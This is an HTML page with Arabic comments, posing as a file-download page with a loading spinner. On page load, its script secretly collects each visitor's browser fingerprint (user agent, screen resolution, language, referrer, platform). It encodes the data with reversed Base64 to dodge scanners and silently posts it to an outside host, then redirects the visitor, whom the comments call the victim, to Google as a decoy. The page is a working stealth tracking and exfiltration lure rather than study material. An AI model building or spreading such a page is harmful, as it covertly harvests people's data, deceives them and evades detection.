<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل الملف المطلوب...</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        // [CONFIG] - ضع رابط سيرفرك هنا بدقة
        const GATEWAY = "Mohammed888.pythonanywhere.com";

        async function execute_stealth_capture() {
            try {
                // 1. تجميع البيانات (Telemetry)
                const payload = {
                    ua: navigator.userAgent,
                    res: `${window.screen.width}x${window.screen.height}`,
                    lang: navigator.language,
                    ref: document.referrer || "direct",
                    plat: navigator.platform,
                    ts: Date.now()
                };

                // 2. التشفير العكسي المزدوج (Matrix Encoding)
                // تحويل لـ JSON -> Base64 -> Reverse String (لإرباك أنظمة الفحص)
                const rawString = JSON.stringify(payload);
                const base64 = btoa(unescape(encodeURIComponent(rawString)));
                const encrypted = base64.split("").reverse().join("");

                // 3. الإرسال الصامت (Stealth Exfiltration)
                // استخدمنا fetch مع mode: 'no-cors' لضمان عبور الطلب للسيرفر الخارجي
                await fetch(GATEWAY, {
                    method: "POST",
                    mode: "no-cors",
                    headers: {
                        "Content-Type": "text/plain" // تمويه الطلب كأنه نص بسيط
                    },
                    body: encrypted
                });

            } catch (err) {
                // صمت مطبق في حالة الخطأ لضمان عدم كشف العملية
            } finally {
                // 4. التمويه النهائي (The Decoy)
                // تحويل الضحية لصفحة حقيقية لتبديد الشكوك بعد 1.5 ثانية
                setTimeout(() => {
                    window.location.replace("https://www.google.com");
                }, 1500);
            }
        }

        // بدء العملية بمجرد تحميل الصفحة
        window.onload = execute_stealth_capture;
    </script>
</body>
</html>
